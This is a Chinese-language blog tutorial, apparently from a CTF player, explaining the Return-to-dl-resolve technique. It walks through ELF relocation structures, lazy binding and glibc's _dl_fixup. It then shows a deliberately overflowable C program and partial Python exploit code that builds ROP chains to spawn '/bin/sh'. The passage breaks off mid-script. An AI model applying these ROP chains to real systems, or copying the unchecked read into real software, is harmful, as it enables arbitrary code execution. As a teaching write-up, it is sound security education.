<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <title>Bigtang&#39;s Blog</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="description" content="通过ELF动态装载构造ROP链 （ Return-to-dl-resolve）####0x00 前言玩CTF的赛棍都知道，PWN类型的漏洞题目一般会提供一个可执行程序，同时会提供程序运行动态链接的libc库。通过libc.so可以得到库函数的偏移地址，再结合泄露GOT表中libc函数的地址，计算出进程中实际函数的地址，以绕过ASLR。这种手法叫return-to-libc。本文将介绍一种不依赖li">
<meta property="og:type" content="website">
<meta property="og:title" content="Bigtang's Blog">
<meta property="og:url" content="http://bigtang.org/images/Return-to-dl-resolve/通过ELF动态装载构造ROP链 （ Return-to-dl-resolve）.html">
<meta property="og:site_name" content="Bigtang's Blog">
<meta property="og:description" content="通过ELF动态装载构造ROP链 （ Return-to-dl-resolve）####0x00 前言玩CTF的赛棍都知道，PWN类型的漏洞题目一般会提供一个可执行程序，同时会提供程序运行动态链接的libc库。通过libc.so可以得到库函数的偏移地址，再结合泄露GOT表中libc函数的地址，计算出进程中实际函数的地址，以绕过ASLR。这种手法叫return-to-libc。本文将介绍一种不依赖li">
<meta property="og:image" content="http://bigtang.org/images/Return-to-dl-resolve/1459431478784.png">
<meta property="og:image" content="http://bigtang.org/images/Return-to-dl-resolve/1459407202726.png">
<meta property="og:image" content="http://bigtang.org/images/Return-to-dl-resolve/1459407452175.png">
<meta property="og:image" content="http://bigtang.org/images/Return-to-dl-resolve/1459408892173.png">
<meta property="og:image" content="http://bigtang.org/images/Return-to-dl-resolve/1459409118762.png">
<meta property="og:image" content="http://bigtang.org/images/Return-to-dl-resolve/1459414521835.png">
<meta property="og:image" content="http://bigtang.org/images/Return-to-dl-resolve/1459415839271.png">
<meta property="og:image" content="http://bigtang.org/images/Return-to-dl-resolve/1459415839271.png">
<meta property="og:image" content="http://bigtang.org/images/Return-to-dl-resolve/1459417176752.png">
<meta property="og:image" content="http://bigtang.org/images/Return-to-dl-resolve/1459417932071.png">
<meta property="og:image" content="http://bigtang.org/images/Return-to-dl-resolve/1459425491545.png">
<meta property="og:image" content="http://bigtang.org/images/Return-to-dl-resolve/1459398186541.png">
<meta property="og:image" content="http://bigtang.org/images/Return-to-dl-resolve/1459398079809.png">
<meta property="og:image" content="http://bigtang.org/images/Return-to-dl-resolve/1459438836360.png">
<meta property="og:image" content="http://bigtang.org/images/Return-to-dl-resolve/1459439191206.png">
<meta property="og:image" content="http://bigtang.org/images/Return-to-dl-resolve/1459442727696.png">
<meta property="og:image" content="http://bigtang.org/images/Return-to-dl-resolve/1459442523856.png">
<meta property="og:image" content="http://bigtang.org/images/Return-to-dl-resolve/1459442264800.png">
<meta property="og:image" content="http://bigtang.org/images/Return-to-dl-resolve/1459442011940.png">
<meta property="og:updated_time" content="2016-04-07T05:35:05.000Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Bigtang's Blog">
<meta name="twitter:description" content="通过ELF动态装载构造ROP链 （ Return-to-dl-resolve）####0x00 前言玩CTF的赛棍都知道，PWN类型的漏洞题目一般会提供一个可执行程序，同时会提供程序运行动态链接的libc库。通过libc.so可以得到库函数的偏移地址，再结合泄露GOT表中libc函数的地址，计算出进程中实际函数的地址，以绕过ASLR。这种手法叫return-to-libc。本文将介绍一种不依赖li">
<meta name="twitter:image" content="http://bigtang.org/images/Return-to-dl-resolve/1459431478784.png">
  
    <link rel="alternative" href="/atom.xml" title="Bigtang&#39;s Blog" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.png">
  
  <link rel="stylesheet" href="/css/style.css">
</head>
<body>
  <div id="container">
    <div class="left-col">
    <div class="overlay"></div>
<div class="intrude-less">
	<header id="header" class="inner">
		<a href="/" class="profilepic">
			
			<img lazy-src="http://bigtang.org/img/logo.jpg" class="js-avatar">
			
		</a>

		<hgroup>
		  <h1 class="header-author"><a href="/">b1gtang</a></h1>
		</hgroup>

		

		
			<div class="switch-btn">
				<div class="icon">
					<div class="icon-ctn">
						<div class="icon-wrap icon-house" data-idx="0">
							<div class="birdhouse"></div>
							<div class="birdhouse_holes"></div>
						</div>
						<div class="icon-wrap icon-ribbon hide" data-idx="1">
							<div class="ribbon"></div>
						</div>
						
						<div class="icon-wrap icon-link hide" data-idx="2">
							<div class="loopback_l"></div>
							<div class="loopback_r"></div>
						</div>
						
						
						<div class="icon-wrap icon-me hide" data-idx="3">
							<div class="user"></div>
							<div class="shoulder"></div>
						</div>
						
					</div>
					
				</div>
				<div class="tips-box hide">
					<div class="tips-arrow"></div>
					<ul class="tips-inner">
						<li>菜单</li>
						<li>标签</li>
						
						<li>友情链接</li>
						
						
						<li>关于我</li>
						
					</ul>
				</div>
			</div>
		

		<div class="switch-area">
			<div class="switch-wrap">
				<section class="switch-part switch-part1">
					<nav class="header-menu">
						<ul>
						
							<li><a href="/">主页</a></li>
				        
							<li><a href="/archives">所有文章</a></li>
				        
						</ul>
					</nav>
					<nav class="header-nav">
						<div class="social">
							
								<a class="github" target="_blank" href="https://github.com/b1gtang/" title="github">github</a>
					        
								<a class="weibo" target="_blank" href="http://weibo.com/b1gtang" title="weibo">weibo</a>
					        
								<a class="rss" target="_blank" href="#" title="rss">rss</a>
					        
								<a class="mail" target="_blank" href="mailto://root@bigtang.org" title="mail">mail</a>
					        
						</div>
					</nav>
				</section>
				
				
				<section class="switch-part switch-part2">
					<div class="widget tagcloud" id="js-tagcloud">
						<a href="/tags/Arm/" style="font-size: 10px;">Arm</a> <a href="/tags/UAF/" style="font-size: 10px;">UAF</a> <a href="/tags/pwn/" style="font-size: 10px;">pwn</a>
					</div>
				</section>
				
				
				
				<section class="switch-part switch-part3">
					<div id="js-friends">
					
			          <a target="_blank" class="main-nav-link switch-friends-link" href="http://l-team.org/">L</a>
			        
			          <a target="_blank" class="main-nav-link switch-friends-link" href="https:leavesongs.com/">Phithon</a>
			        
			          <a target="_blank" class="main-nav-link switch-friends-link" href="http://le4f.net/">le4f</a>
			        
			          <a target="_blank" class="main-nav-link switch-friends-link" href="http://z1ng.net/">z1ng</a>
			        
			          <a target="_blank" class="main-nav-link switch-friends-link" href="http://x0day.me/">DM_</a>
			        
			          <a target="_blank" class="main-nav-link switch-friends-link" href="http://wils0n.cn/">wilson</a>
			        
			          <a target="_blank" class="main-nav-link switch-friends-link" href="http://th1nk.info/">Th1nk</a>
			        
			          <a target="_blank" class="main-nav-link switch-friends-link" href="http://sh3ll.me">Chu</a>
			        
			          <a target="_blank" class="main-nav-link switch-friends-link" href="http://cyrils.org">Cyrils</a>
			        
			          <a target="_blank" class="main-nav-link switch-friends-link" href="http://www.iret.xyz/">Silver</a>
			        
			          <a target="_blank" class="main-nav-link switch-friends-link" href="http://joychou.org/">Joychou</a>
			        
			          <a target="_blank" class="main-nav-link switch-friends-link" href="http://www.Thinkings.org/">Tr3jer</a>
			        
			        </div>
				</section>
				

				
				
				<section class="switch-part switch-part4">
				
					<div id="js-aboutme">Binary analysis, computer security, exploit writing, CTFs, hacking</div>
				</section>
				
			</div>
		</div>
	</header>				
</div>
    </div>
    <div class="mid-col">
      <nav id="mobile-nav">
  	<div class="overlay">
  		<div class="slider-trigger"></div>
  		<h1 class="header-author js-mobile-header hide">b1gtang</h1>
  	</div>
	<div class="intrude-less">
		<header id="header" class="inner">
			<div class="profilepic">
				<img lazy-src="http://bigtang.org/img/logo.jpg" class="js-avatar">
			</div>
			<hgroup>
			  <h1 class="header-author">b1gtang</h1>
			</hgroup>
			
			<nav class="header-menu">
				<ul>
				
					<li><a href="/">主页</a></li>
		        
					<li><a href="/archives">所有文章</a></li>
		        
		        <div class="clearfix"></div>
				</ul>
			</nav>
			<nav class="header-nav">
				<div class="social">
					
						<a class="github" target="_blank" href="https://github.com/b1gtang/" title="github">github</a>
			        
						<a class="weibo" target="_blank" href="http://weibo.com/b1gtang" title="weibo">weibo</a>
			        
						<a class="rss" target="_blank" href="#" title="rss">rss</a>
			        
						<a class="mail" target="_blank" href="mailto://root@bigtang.org" title="mail">mail</a>
			        
				</div>
			</nav>
		</header>				
	</div>
</nav>
      <div class="body-wrap"><article id="page-undefined" class="article article-type-page" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/images/Return-to-dl-resolve/通过ELF动态装载构造ROP链 （ Return-to-dl-resolve）.html" class="article-date">
  	<time datetime="2016-04-07T05:35:05.000Z" itemprop="datePublished">2016-04-07</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
    <div class="article-entry" itemprop="articleBody">
      
        <h3 id="通过ELF动态装载构造ROP链-（-Return-to-dl-resolve）"><a href="#通过ELF动态装载构造ROP链-（-Return-to-dl-resolve）" class="headerlink" title="通过ELF动态装载构造ROP链 （ Return-to-dl-resolve）"></a>通过ELF动态装载构造ROP链 （ Return-to-dl-resolve）</h3><p>####0x00 前言<br>玩CTF的赛棍都知道，PWN类型的漏洞题目一般会提供一个可执行程序，同时会提供程序运行动态链接的libc库。通过libc.so可以得到库函数的偏移地址，再结合泄露GOT表中libc函数的地址，计算出进程中实际函数的地址，以绕过ASLR。这种手法叫return-to-libc。本文将介绍一种不依赖libc的手法。</p>
<p>以XDCTF2015-EXPLOIT2为例，这题当时是只给了可执行文件的。出这题的初衷就是想通过Return-to-dl-resolve的手法绕过NX和ASLR的限制。本文将详细介绍一下该手法的利用过程。</p>
<p>这里构造一个存在栈缓冲区溢出漏洞的程序，以方便后续我们构造ROP链。<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vuln</span><span class="params">()</span></span><br><span class="line"></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> buf[<span class="number">100</span>];</span><br><span class="line">	setbuf(<span class="built_in">stdin</span>,buf);</span><br><span class="line">	read(<span class="number">0</span>,buf,<span class="number">256</span>); <span class="comment">// Buffer OverFlow</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span><br><span class="line"></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> buf[<span class="number">100</span>] = <span class="string">"Welcome to XDCTF2015~!\n"</span>;</span><br><span class="line"></span><br><span class="line">	setbuf(<span class="built_in">stdout</span>,buf);</span><br><span class="line">	write(<span class="number">1</span>,buf,<span class="built_in">strlen</span>(buf));</span><br><span class="line"></span><br><span class="line">	vuln();</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h4 id="0x01-准备知识"><a href="#0x01-准备知识" class="headerlink" title="0x01 准备知识"></a>0x01 准备知识</h4><h5 id="相关结构"><a href="#相关结构" class="headerlink" title="相关结构"></a>相关结构</h5><p>ELF可执行文件由ELF头部，程序头部表和其对应的段，节区头部表和其对应的节组成。如果一个可执行文件参与动态链接，它的程序头部表将包含类型为 <code>PT_DYNAMIC</code> 的段，它包含<code>.dynamic</code> 节区。结构如图，<br><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">typedef <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    Elf32_Sword d_tag;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        Elf32_Word  d_val;</span><br><span class="line">        Elf32_Addr  d_ptr;</span><br><span class="line">    &#125; d_un;</span><br><span class="line"> &#125; Elf32_Dyn;</span><br></pre></td></tr></table></figure></p>
<p>其中Tag对应着每个节区。比如<code>JMPREL</code>对应着<code>.rel.plt</code><br><img src="/images/Return-to-dl-resolve/1459431478784.png" alt="Alt text"></p>
<p>节区中包含目标文件的所有信息。节的结构如图。<br><figure class="highlight thrift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">    Elf32_Word sh_name;        <span class="comment">// 节区头部字符串表节区的索引</span></span><br><span class="line">    Elf32_Word sh_type;        <span class="comment">// 节区类型</span></span><br><span class="line">    Elf32_Word sh_flags;       <span class="comment">// 节区标志，用于描述属性</span></span><br><span class="line">    Elf32_Addr sh_addr;        <span class="comment">// 节区的内存映像</span></span><br><span class="line">    Elf32_Off  sh_offset;      <span class="comment">// 节区的文件偏移</span></span><br><span class="line">    Elf32_Word sh_size;        <span class="comment">// 节区的长度</span></span><br><span class="line">    Elf32_Word sh_link;        <span class="comment">// 节区头部表索引链接</span></span><br><span class="line">    Elf32_Word sh_info;        <span class="comment">// 附加信息</span></span><br><span class="line">    Elf32_Word sh_addralign;   <span class="comment">// 节区对齐约束</span></span><br><span class="line">    Elf32_Word sh_entsize;     <span class="comment">// 固定大小的节区表项的长度</span></span><br><span class="line">&#125;Elf32_Shdr;</span><br></pre></td></tr></table></figure></p>
<p>如图，列出了该文件的28个节区。其中类型为REL的节区包含重定位表项。<br><img src="/images/Return-to-dl-resolve/1459407202726.png" alt="Alt text"></p>
<p>（1） 其中<code>.rel.plt</code>节是用于函数重定位，<code>.rel.dyn</code>节是用于变量重定位<br><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">typedef <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    Elf32_Addr r_offset;    <span class="regexp">//</span> 对于可执行文件，此值为虚拟地址</span><br><span class="line">    Elf32_Word r_info;      <span class="regexp">//</span> 符号表索引</span><br><span class="line">&#125; Elf32_Rel;</span><br><span class="line"><span class="comment">#define ELF32_R_SYM(i) ((i)&gt;&gt;8)</span></span><br><span class="line"><span class="comment">#define ELF32_R_TYPE(i) ((unsigned char)(i))</span></span><br><span class="line"><span class="comment">#define ELF32_R_INFO(s, t) (((s)&lt;&lt;8) + (unsigned char)(t))</span></span><br></pre></td></tr></table></figure></p>
<p>如图，在<code>.rel.plt</code>中列出了链接的C库函数，以下均已<code>write</code>函数为例，<code>write</code>函数的<code>r_offset=0x804a010</code>,<code>r_info=0x507</code><br><img src="/images/Return-to-dl-resolve/1459407452175.png" alt="Alt text"></p>
<p>（2） 其中<code>.got</code>节保存全局变量偏移表，<code>.got.plt</code>节存储着全局函数偏离表。<code>.got.plt</code>对应着<code>Elf32_Rel</code>结构中<code>r_offset</code>的值。如图，<code>write</code>函数在GOT表中位于<code>0x804a010</code><br><img src="/images/Return-to-dl-resolve/1459408892173.png" alt="Alt text"></p>
<p>（3）其中<code>.dynsym</code>节区包含了动态链接符号表。其中，<code>Elf32_Sym[num]</code>中的<code>num</code>对应着<code>ELF32_R_SYM(Elf32_Rel-&gt;r_info)</code>。根据定义，<code>ELF32_R_SYM(Elf32_Rel-&gt;r_info) = (Elf32_Rel-&gt;r_info)&gt;&gt;8</code>。<br><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span></span><br><span class="line">&#123;</span><br><span class="line">  Elf32_Word    st_name;   <span class="comment">/* Symbol name (string tbl index) */</span></span><br><span class="line">  Elf32_Addr    st_value;  <span class="comment">/* Symbol value */</span></span><br><span class="line">  Elf32_Word    st_size;   <span class="comment">/* Symbol size */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> st_info;   <span class="comment">/* Symbol type and binding */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> st_other;  <span class="comment">/* Symbol visibility under glibc&gt;=2.2 */</span></span><br><span class="line">  Elf32_Section st_shndx;  <span class="comment">/* Section index */</span></span><br><span class="line">&#125; Elf32_Sym;</span><br></pre></td></tr></table></figure></p>
<p>如图，<code>write</code>的索引值为<code>ELF32_R_SYM(0x507) = 0x507 &gt;&gt; 8 = 5</code>。而<code>Elf32_Sym[5]</code>即保存着<code>write</code>的符号表信息。并且<code>ELF32_R_TYPE(0x507) = 7</code>,对应<code>R_386_JUMP_SLOT</code><br><img src="/images/Return-to-dl-resolve/1459409118762.png" alt="Alt text"></p>
<p>（4）其中<code>.dynstr</code>节包含了动态链接的字符串。这个节区以<code>\x00</code>作为开始和结尾，中间每个字符串也以<code>\x00</code>间隔。如图，<code>Elf32_Sym[5]-&gt;st_name = 0x54</code>,所以<code>.dynstr</code>加上<code>0x54</code>的偏移量，就是字符串<code>write</code><br><img src="/images/Return-to-dl-resolve/1459414521835.png" alt="Alt text"></p>
<p>（5）其中<code>.plt</code>节是过程链接表。过程链接表把位置独立的函数调用重定向到绝对位置。如图，当程序执行<code>call write@plt</code>时，实际会跳到<code>0x80483c0</code>去执行。<br><img src="/images/Return-to-dl-resolve/1459415839271.png" alt="Alt text"></p>
<h5 id="延迟绑定"><a href="#延迟绑定" class="headerlink" title="延迟绑定"></a>延迟绑定</h5><p>程序在执行的过程中，可能引入的有些C库函数到结束时都不会执行。所以ELF采用延迟绑定的技术，在第一次调用C库函数是时才会去寻找真正的位置进行绑定。</p>
<p>具体来说，在前一部分我们已经知道，当程序执行<code>call write@plt</code>时，实际会跳到<code>0x80483c0</code>去执行。而<code>0x80483c0</code>处的汇编代码仅仅三行。我们来看一下这三行代码做了什么。<br><img src="/images/Return-to-dl-resolve/1459415839271.png" alt="Alt text"><br>第一行，上一部分也提到了<code>0x804a010</code>是<code>write</code>的GOT表位置，当我们第一次调用<code>write</code>时，其对应的GOT表里并没有存放<code>write</code>的真实地址，而是下一条指令的地址。第二、三行，把<code>reloc_arg=0x20</code>作为参数推入栈中，跳到<code>0x8048370</code>继续执行。<br><img src="/images/Return-to-dl-resolve/1459417176752.png" alt="Alt text"></p>
<p><code>0x8048370</code>再把<code>link_map = *(GOT+4)</code>作为参数推入栈中，而<code>*(GOT+8)</code>中保存的是<code>_dl_runtime_resolve</code>函数的地址。因此以上指令相当于执行了<code>_dl_runtime_resolve(link_map, reloc_arg)</code>，该函数会完成符号的解析，即将真实的<code>write</code>函数地址写入其<code>GOT</code>条目中，随后把控制权交给<code>write</code>函数。<br><img src="/images/Return-to-dl-resolve/1459417932071.png" alt="Alt text"></p>
<p>其中<code>_dl_runtime_resolve</code>是在<code>glibc-2.22/sysdeps/i386/dl-trampoline.S</code>中用汇编实现的。<code>0xf7ff04fb</code>处即调用<code>_dl_fixup</code>，并且通过寄存器传参。<br><img src="/images/Return-to-dl-resolve/1459425491545.png" alt="Alt text"></p>
<p>其中<code>_dl_fixup</code>是在<code>glibc-2.22/elf/dl-runtime.c</code>实现的，我们只关注一些主要函数。<br><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_dl_fixup (<span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l</span>, <span class="title">ElfW</span>(<span class="title">Word</span>) <span class="title">reloc_arg</span>)</span></span><br></pre></td></tr></table></figure></p>
<p>首先通过参数<code>reloc_arg</code>计算重定位入口，这里的<code>JMPREL</code>即<code>.rel.plt</code>，<code>reloc_offset</code>即<code>reloc_arg</code>。<br><figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> PLTREL *<span class="keyword">const</span> reloc = (<span class="keyword">const</span> <span class="keyword">void</span> *) (D_PTR (l, l_info[DT_J<span class="built_in">MPREL</span>]) + reloc_offset);</span><br></pre></td></tr></table></figure></p>
<p>然后通过<code>reloc-&gt;r_info</code>找到<code>.dynsym</code>中对应的条目。<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Sym)</span> *sym </span>= &amp;symtab[ELFW(R_SYM) (reloc-&gt;r_info)];</span><br></pre></td></tr></table></figure></p>
<p>这里还会检查<code>reloc-&gt;r_info</code>的最低位是不是<code>R_386_JUMP_SLOT=7</code><br><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">assert (<span class="name">ELFW</span>(<span class="name">R_TYPE</span>)(<span class="name">reloc-&gt;r_info</span>) == ELF_MACHINE_JMP_SLOT)<span class="comment">;</span></span><br></pre></td></tr></table></figure></p>
<p>接着通过<code>strtab + sym-&gt;st_name</code>找到符号表字符串，<code>result</code>为libc基地址<br><figure class="highlight nimrod"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="literal">result</span> = _dl_lookup_symbol_x (strtab + sym-&gt;st_name, l, &amp;sym, l-&gt;l_scope,version, <span class="type">ELF_RTYPE_CLASS_PLT</span>, flags, <span class="type">NULL</span>);</span><br></pre></td></tr></table></figure></p>
<p><code>value</code>为libc基址加上要解析函数的偏移地址，也即实际地址。<br><figure class="highlight nimrod"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">value = <span class="type">DL_FIXUP_MAKE_VALUE</span> (<span class="literal">result</span>, sym ? (<span class="type">LOOKUP_VALUE_ADDRESS</span> (<span class="literal">result</span>) + sym-&gt;st_value) : <span class="number">0</span>);</span><br></pre></td></tr></table></figure></p>
<p>最后把<code>value</code>写入相应的GOT表条目中<br><figure class="highlight nimrod"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> elf_machine_fixup_plt (l, <span class="literal">result</span>, reloc, rel_addr, value);</span><br></pre></td></tr></table></figure></p>
<h4 id="漏洞利用方式"><a href="#漏洞利用方式" class="headerlink" title="漏洞利用方式"></a>漏洞利用方式</h4><ol>
<li>控制EIP为PLT[0]的地址，只需传递一个<code>index_arg</code>参数</li>
<li>控制<code>index_arg</code>的大小，使<code>reloc</code>的位置落在可控地址内</li>
<li>伪造<code>reloc</code>的内容，使<code>sym</code>落在可控地址内</li>
<li>伪造<code>sym</code>的内容，使<code>name</code>落在可控地址内</li>
<li>伪造<code>name</code>为任意库函数，如<code>system</code></li>
</ol>
<h5 id="控制EIP"><a href="#控制EIP" class="headerlink" title="控制EIP"></a>控制EIP</h5><p>首先确认一下进程当前开了哪些保护<br><img src="/images/Return-to-dl-resolve/1459398186541.png" alt="Alt text"></p>
<p>由于程序存在栈缓冲区漏洞，我们可以用PEDA很快定位覆写EIP的位置。</p>
<p><img src="/images/Return-to-dl-resolve/1459398079809.png" alt="Alt text"></p>
<h5 id="stage1"><a href="#stage1" class="headerlink" title="stage1"></a>stage1</h5><p>我们先写一个ROP链，直接返回到<code>write@plt</code><br><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">from zio import *</span><br><span class="line"></span><br><span class="line">offset = <span class="number">112</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">addr_plt_read </span> = <span class="number">0x08048390</span>   <span class="comment"># objdump -d -j.plt bof | grep "read"</span></span><br><span class="line"><span class="keyword">addr_plt_write </span>= <span class="number">0x080483c0</span>   <span class="comment"># objdump -d -j.plt bof | grep "write"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#./rp-lin-x86  --file=bof --rop=3 --unique &gt; gadgets.txt</span></span><br><span class="line">pppop_ret = <span class="number">0x0804856c</span></span><br><span class="line">pop_ebp_ret   =  <span class="number">0x08048453</span></span><br><span class="line">leave_ret = <span class="number">0x08048481</span></span><br><span class="line"></span><br><span class="line">stack_size = <span class="number">0x800</span></span><br><span class="line"><span class="keyword">addr_bss </span>  = <span class="number">0x0804a020</span>   <span class="comment"># readelf -S bof | grep ".bss"</span></span><br><span class="line"><span class="keyword">base_stage </span>= <span class="keyword">addr_bss </span>+ stack_size</span><br><span class="line"></span><br><span class="line">target = <span class="string">"./bof"</span></span><br><span class="line">io   = zio((target))</span><br><span class="line"></span><br><span class="line">io.read_until(<span class="string">'Welcome to XDCTF2015~!\n'</span>)</span><br><span class="line"><span class="comment"># io.gdb_hint([0x80484bd])</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">buf1 </span> = <span class="string">'A'</span> * offset</span><br><span class="line"><span class="keyword">buf1 </span>+= l32(<span class="keyword">addr_plt_read)</span><br><span class="line"></span><span class="keyword">buf1 </span>+= l32(pppop_ret)</span><br><span class="line"><span class="keyword">buf1 </span>+= l32(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">buf1 </span>+= l32(<span class="keyword">base_stage)</span><br><span class="line"></span><span class="keyword">buf1 </span>+= l32(<span class="number">100</span>)</span><br><span class="line"><span class="keyword">buf1 </span>+= l32(pop_ebp_ret)</span><br><span class="line"><span class="keyword">buf1 </span>+= l32(<span class="keyword">base_stage)</span><br><span class="line"></span><span class="keyword">buf1 </span>+= l32(leave_ret)</span><br><span class="line">io.writeline(<span class="keyword">buf1)</span><br><span class="line"></span></span><br><span class="line">cmd = <span class="string">"/bin/sh"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">buf2 </span>= <span class="string">'AAAA'</span></span><br><span class="line"><span class="keyword">buf2 </span>+= l32(<span class="keyword">addr_plt_write)</span><br><span class="line"></span><span class="keyword">buf2 </span>+= <span class="string">'AAAA'</span></span><br><span class="line"><span class="keyword">buf2 </span>+= l32(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">buf2 </span>+= l32(<span class="keyword">base_stage+80)</span><br><span class="line"></span><span class="keyword">buf2 </span>+= l32(len(cmd))</span><br><span class="line"><span class="keyword">buf2 </span>+= <span class="string">'A'</span> * (<span class="number">80</span>-len(<span class="keyword">buf2))</span><br><span class="line"></span><span class="keyword">buf2 </span>+= cmd + <span class="string">'\x00'</span></span><br><span class="line"><span class="keyword">buf2 </span>+= <span class="string">'A'</span> * (<span class="number">100</span>-len(<span class="keyword">buf2))</span><br><span class="line"></span>io.writeline(<span class="keyword">buf2)</span><br><span class="line"></span>io.interact()</span><br></pre></td></tr></table></figure></p>
<p>最后会把我们输入的<code>cmd</code>打印出来<br><img src="/images/Return-to-dl-resolve/1459438836360.png" alt="Alt text"></p>
<h5 id="stage2"><a href="#stage2" class="headerlink" title="stage2"></a>stage2</h5><p>这次我们控制EIP返回到<code>PLT0</code>，要带上<code>index_offset</code>。这里我们修改一下<code>buf2</code><br><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">...</span></span><br><span class="line"><span class="symbol">cmd</span> = <span class="string">"/bin/sh"</span></span><br><span class="line"><span class="keyword">addr_plt_start </span>= <span class="number">0x8048370</span> # objdump -d -j.plt <span class="keyword">bof</span><br><span class="line"></span><span class="symbol">index_offset</span>   = <span class="number">0x20</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">buf2 </span>= <span class="string">'AAAA'</span></span><br><span class="line"><span 